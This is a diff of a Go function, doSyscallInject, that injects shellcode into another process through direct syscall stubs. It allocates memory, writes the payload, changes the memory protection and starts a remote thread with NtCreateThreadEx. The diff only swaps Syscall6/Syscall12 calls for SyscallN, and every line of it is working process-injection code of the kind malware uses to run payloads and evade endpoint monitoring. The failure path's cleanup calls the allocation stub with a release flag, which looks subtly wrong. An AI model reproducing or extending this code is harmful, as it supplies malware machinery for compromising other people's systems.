@@ -72,7 +72,7 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 
 	var allocAddr uintptr
 	regionSize := uintptr(len(sc))
-	r1, _, _ := syscall.Syscall6(stubAlloc, 6,
+	r1, _, _ := syscall.SyscallN(stubAlloc,
 		hProc,
 		uintptr(unsafe.Pointer(&allocAddr)),
 		0,
@@ -85,7 +85,7 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 	}
 
 	var written uint32
-	r1, _, _ = syscall.Syscall6(stubWrite, 5,
+	r1, _, _ = syscall.SyscallN(stubWrite,
 		hProc,
 		allocAddr,
 		uintptr(unsafe.Pointer(&sc[0])),
@@ -94,12 +94,12 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 		0,
 	)
 	if r1 != 0 {
-		syscall.Syscall6(stubAlloc, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
+		syscall.SyscallN(stubAlloc, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
 		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
 	}
 
 	var oldProt uint32
-	r1, _, _ = syscall.Syscall6(stubProtect, 5,
+	r1, _, _ = syscall.SyscallN(stubProtect,
 		hProc,
 		uintptr(unsafe.Pointer(&allocAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
@@ -112,7 +112,7 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 	}
 
 	var hThread uintptr
-	r1, _, _ = syscall.Syscall12(stubCreateThread, 11,
+	r1, _, _ = syscall.SyscallN(stubCreateThread,
 		uintptr(unsafe.Pointer(&hThread)),
 		0x1FFFFF,  // DesiredAccess
 		0,         // ObjectAttributes
@@ -130,8 +130,8 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 		return fmt.Errorf("NtCreateThreadEx failed: 0x%X (shellcode at 0x%X)", r1, allocAddr)
 	}
 
-	syscall.Syscall6(stubWait, 2, hThread, 0, 0xFFFFFFFF, 0, 0, 0)
-	syscall.Syscall6(stubClose, 1, hThread, 0, 0, 0, 0, 0)
+	syscall.SyscallN(stubWait, hThread, 0, 0xFFFFFFFF, 0, 0, 0)
+	syscall.SyscallN(stubClose, hThread, 0, 0, 0, 0, 0)
 	return nil
 }
 
